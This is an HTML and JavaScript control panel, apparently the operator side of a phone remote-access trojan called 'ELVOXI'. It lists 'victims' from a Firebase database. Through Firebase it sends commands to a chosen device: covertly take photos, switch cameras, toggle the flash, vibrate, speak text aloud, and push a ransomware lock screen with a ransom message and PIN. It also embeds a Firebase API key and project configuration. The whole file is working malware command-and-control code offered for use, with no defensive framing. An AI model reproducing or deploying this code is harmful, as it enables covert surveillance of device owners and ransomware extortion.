<!DOCTYPE html>
<html>
<head>
    <title>ELVOXI MASTER</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        :root { --neon: #ff0055; --bg: #050505; }
        body { background: var(--bg); color: #fff; font-family: sans-serif; margin: 0; }
        #page-list { padding: 20px; }
        .device-card { background: #111; border: 1px solid #333; padding: 20px; border-radius: 12px; margin-bottom: 15px; cursor: pointer; display: flex; justify-content: space-between; border-left: 5px solid var(--neon); }
        .header { position: fixed; top: 0; width: 100%; background: #000; border-bottom: 1px solid var(--neon); padding: 15px; z-index: 100; display: flex; align-items: center; box-sizing: border-box; }
        .drawer { position: fixed; top: 0; left: -300px; width: 290px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.4s; z-index: 200; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .drawer.active { left: 0; }
        .menu-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 15px; background: #1a1a1a; padding: 10px; border-radius: 8px; }
        .btn { padding: 8px 12px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 11px; }
        .btn-on { background: #0f0; color: #000; } .btn-off { background: #f00; color: #fff; }
        .main-content { padding: 80px 20px; text-align: center; }
        input { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; margin-bottom: 5px; border-radius: 5px; box-sizing: border-box; }
        img { width: 100%; border-radius: 10px; border: 1px solid var(--neon); margin-top: 15px; }
        .overlay { position: fixed; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); display: none; z-index: 150; }
        .overlay.active { display: block; }
    </style>
</head>
<body>
    <div class="overlay" id="overlay" onclick="toggleDrawer()"></div>
    <div id="page-list">
        <h1 style="color:var(--neon); text-align:center;">ELVOXI | VICTIMS</h1>
        <div id="targetList">Scanning...</div>
    </div>

    <div id="page-control" style="display:none;">
        <div class="header">
            <button onclick="toggleDrawer()" style="background:var(--neon); border:none; padding:10px; font-weight:bold; border-radius:5px; color:#fff;">☰ REMOTE</button>
            <span id="activeName" style="margin-left:15px; color:var(--neon); font-weight:bold;"></span>
            <button onclick="location.reload()" style="margin-left:auto; background:#333; border:none; color:white; padding:10px; border-radius:5px;">EXIT</button>
        </div>

        <div class="drawer" id="drawer">
            <h3 style="color:var(--neon); text-align:center;">ELVOXI REMOTE</h3>
            
            <div class="menu-row"><span>KAMERA</span><div>
                <button class="btn btn-on" onclick="switchCam('user')">DEPAN</button>
                <button class="btn btn-off" onclick="switchCam('environment')">BKG</button>
            </div></div>

            <div class="menu-row"><span>FLASH</span><div>
                <button class="btn btn-on" onclick="cmd('flash','on')">ON</button>
                <button class="btn btn-off" onclick="cmd('flash','off')">OFF</button>
            </div></div>

            <div class="menu-row"><span>VIBRATE</span><div>
                <button class="btn btn-on" onclick="cmd('vbt_on')">BOM</button>
                <button class="btn btn-off" onclick="cmd('vbt_off')">OFF</button>
            </div></div>

            <input type="text" id="vT" placeholder="Pesan Suara..."><button class="btn btn-on" style="width:100%; margin-bottom:15px;" onclick="speak()">KIRIM SUARA</button>
            
            <div style="background:#1a1a1a; padding:10px; border-radius:8px; border:1px solid red;">
                <span style="color:red; font-weight:bold;">RANSOMWARE LOCK</span>
                <input type="text" id="rT" placeholder="Judul Lock">
                <input type="text" id="rM" placeholder="Pesan Penebusan">
                <input type="number" id="rP" placeholder="PIN Rahasia">
                <button class="btn btn-off" style="width:100%" onclick="sendRansom()">SEND LOCK</button>
            </div>
        </div>

        <div class="main-content">
            <div id="dispModel" style="font-size:24px; color:var(--neon); font-weight:bold;">--</div>
            <div id="dispBatt" style="color:#0f0; margin-bottom:20px;">Target Active</div>
            <button class="btn btn-on" style="padding:15px; width:100%; font-size:16px;" onclick="cmd('snap')">📸 AMBIL FOTO</button>
            <div id="photoArea"></div>
        </div>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAujMVUdlPs4XGzTTq_o51kRil4OYZ5JoU",
            authDomain: "elvoxi-ganteng.firebaseapp.com",
            databaseURL: "https://elvoxi-ganteng-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "elvoxi-ganteng",
            storageBucket: "elvoxi-ganteng.firebasestorage.app",
            messagingSenderId: "88989958637",
            appId: "1:88989958637:web:c1d21102ef24bbf6de27e4"
        };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let selectedID = "";

        db.ref('targets').on('value', (s) => {
            const list = document.getElementById('targetList'); list.innerHTML = "";
            s.forEach(child => {
                const id = child.key; const d = child.val();
                list.innerHTML += `<div class="device-card" onclick="openControl('${id}','${d.model}')"><span>📱 <b>${d.model}</b></span><span style="color:#0f0">● ONLINE</span></div>`;
                if(id === selectedID && d.foto) {
                    document.getElementById('photoArea').innerHTML = `<img src="${d.foto}"><br><a href="${d.foto}" download="foto.jpg"><button class="btn btn-on" style="margin-top:10px; width:100%">SIMPAN FOTO</button></a>`;
                }
            });
        });

        function openControl(id, model) {
            selectedID = id;
            document.getElementById('page-list').style.display = 'none';
            document.getElementById('page-control').style.display = 'block';
            document.getElementById('activeName').innerText = model;
            document.getElementById('dispModel').innerText = model;
        }
        function toggleDrawer() { document.getElementById('drawer').classList.toggle('active'); document.getElementById('overlay').classList.toggle('active'); }
        function cmd(type, stat='') { db.ref('commands/'+selectedID).push({type: type, status: stat}); }
        function switchCam(m) { db.ref('commands/'+selectedID).push({type: 'switch_cam', mode: m}); alert("Camera Switch Sent!"); }
        function speak() { const t = document.getElementById('vT').value; db.ref('commands/'+selectedID).push({type:'speak', text:t || "Dongo"}); document.getElementById('vT').value=""; }
        function sendRansom() {
            db.ref('commands/'+selectedID).push({
                type: "lock",
                title: document.getElementById('rT').value || "DEVICE ENCRYPTED",
                msg: document.getElementById('rM').value || "Pay to unlock.",
                pin: document.getElementById('rP').value || "1234"
            });
            alert("Lock Sent!"); toggleDrawer();
        }
    </script>
</body>
    </html>
